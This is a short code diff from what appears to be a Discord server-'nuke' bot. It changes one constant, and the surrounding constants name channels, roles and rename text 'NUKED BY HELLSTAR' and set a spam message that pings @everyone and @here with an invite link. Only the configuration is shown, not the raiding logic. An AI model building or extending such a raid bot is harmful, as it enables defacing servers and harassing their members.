@@ -16,7 +16,7 @@ const client = new Client({
 
 const PREFIX = '!';
 const LOG_CHANNEL_ID = '1519135619559981058';
-const NUKE_CHANNEL_NAME = 'NUKED BY MAMBA';
+const NUKE_CHANNEL_NAME = 'NUKED BY PARA';
 const NUKE_ROLE_NAME = 'NUKED BY HELLSTAR';
 const RENAME_TEXT = 'NUKED BY HELLSTAR';
 const MESSAGE_CONTENT = `# ${RENAME_TEXT}\n|| @everyone / @here \n || https://discord.gg/hellstarrp ||`;
